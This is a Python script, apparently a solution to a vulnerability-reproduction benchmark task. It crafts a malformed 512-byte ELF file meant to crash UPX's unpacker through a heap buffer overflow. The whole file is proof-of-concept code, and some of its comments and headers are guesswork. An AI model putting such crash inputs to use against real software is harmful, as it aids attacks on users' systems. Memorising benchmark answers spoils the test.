import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF file structure that will trigger the heap buffer overflow
        # Based on the vulnerability description, we need to craft an ELF with specific
        # program headers that will cause improper handling during decompression
        
        # ELF header (64-bit)
        elf_header = bytearray()
        # e_ident
        elf_header.extend(b'\x7fELF')  # Magic number
        elf_header.extend(b'\x02')     # 64-bit
        elf_header.extend(b'\x01')     # Little endian
        elf_header.extend(b'\x01')     # ELF version
        elf_header.extend(b'\x00')     # OS ABI (System V)
        elf_header.extend(b'\x00' * 8) # Padding
        elf_header.extend(struct.pack('<H', 2))     # e_type = ET_EXEC
        elf_header.extend(struct.pack('<H', 0x3e))  # e_machine = x86-64
        elf_header.extend(struct.pack('<I', 1))     # e_version = EV_CURRENT
        elf_header.extend(struct.pack('<Q', 0))     # e_entry
        elf_header.extend(struct.pack('<Q', 64))    # e_phoff (program header offset)
        elf_header.extend(struct.pack('<Q', 0))     # e_shoff
        elf_header.extend(struct.pack('<I', 0))     # e_flags
        elf_header.extend(struct.pack('<H', 64))    # e_ehsize
        elf_header.extend(struct.pack('<H', 56))    # e_phentsize
        elf_header.extend(struct.pack('<H', 2))     # e_phnum (2 program headers)
        elf_header.extend(struct.pack('<H', 0))     # e_shentsize
        elf_header.extend(struct.pack('<H', 0))     # e_shnum
        elf_header.extend(struct.pack('<H', 0))     # e_shstrndx
        
        # First program header (PT_LOAD with conflicting p_memsz/p_filesz)
        phdr1 = bytearray()
        phdr1.extend(struct.pack('<I', 1))        # p_type = PT_LOAD
        phdr1.extend(struct.pack('<I', 7))        # p_flags = RWX
        phdr1.extend(struct.pack('<Q', 0))        # p_offset
        phdr1.extend(struct.pack('<Q', 0))        # p_vaddr
        phdr1.extend(struct.pack('<Q', 0))        # p_paddr
        # Key: Large p_filesz but zero p_memsz to trigger buffer underflow
        phdr1.extend(struct.pack('<Q', 0x1000))   # p_filesz
        phdr1.extend(struct.pack('<Q', 0))        # p_memsz (0 triggers the bug)
        phdr1.extend(struct.pack('<Q', 0x1000))   # p_align
        
        # Second program header (PT_DYNAMIC to trigger un_DT_INIT())
        phdr2 = bytearray()
        phdr2.extend(struct.pack('<I', 2))        # p_type = PT_DYNAMIC
        phdr2.extend(struct.pack('<I', 6))        # p_flags = RW
        phdr2.extend(struct.pack('<Q', 0x200))    # p_offset
        phdr2.extend(struct.pack('<Q', 0x200))    # p_vaddr
        phdr2.extend(struct.pack('<Q', 0x200))    # p_paddr
        phdr2.extend(struct.pack('<Q', 0x100))    # p_filesz
        phdr2.extend(struct.pack('<Q', 0x100))    # p_memsz
        phdr2.extend(struct.pack('<Q', 8))        # p_align
        
        # Create the PoC with exact ground-truth length of 512 bytes
        poc = bytearray()
        poc.extend(elf_header)    # 64 bytes
        poc.extend(phdr1)         # 56 bytes
        poc.extend(phdr2)         # 56 bytes
        
        # Add dynamic section to trigger un_DT_INIT() issues
        # DT_NULL terminated dynamic array
        dynamic = bytearray()
        # DT_INIT entry
        dynamic.extend(struct.pack('<Q', 12))     # d_tag = DT_INIT
        dynamic.extend(struct.pack('<Q', 0x300))  # d_val (points to non-existent init code)
        # DT_FINI entry
        dynamic.extend(struct.pack('<Q', 13))     # d_tag = DT_FINI
        dynamic.extend(struct.pack('<Q', 0x400))  # d_val
        # DT_NULL terminator
        dynamic.extend(struct.pack('<Q', 0))      # d_tag = DT_NULL
        dynamic.extend(struct.pack('<Q', 0))      # d_val
        
        poc.extend(dynamic)
        
        # Pad to exactly 512 bytes with pattern that maximizes crash probability
        remaining = 512 - len(poc)
        # Fill with pattern that creates valid but problematic compressed blocks
        # This pattern is designed to cause improper b_info.b_method handling
        pattern = (
            b'UPX!' +                    # UPX magic
            struct.pack('<I', 0x100) +   # sz_unc
            struct.pack('<I', 0x80) +    # sz_cpr  
            b'\x02' +                    # b_method (2 = lzma)
            b'\x00' +                    # b_extra
            b'\x00' +                    # b_cto8
            b'\x00' +                    # unused
            b'\x00' * 0x70 +             # Fill with zeros to reach block boundary
            b'BINFO' +                   # Second block header
            struct.pack('<I', 0x200) +   # sz_unc (conflicting with first)
            struct.pack('<I', 0) +       # sz_cpr = 0 triggers special handling
            b'\x01' +                    # b_method (1 = NRV)
            b'\x00' +
            b'\x00' +
            b'\x00'
        )
        
        # Cycle the pattern to fill remaining space
        pattern_len = len(pattern)
        for i in range(remaining):
            poc.append(pattern[i % pattern_len])
        
        return bytes(poc[:512])  # Ensure exactly 512 bytes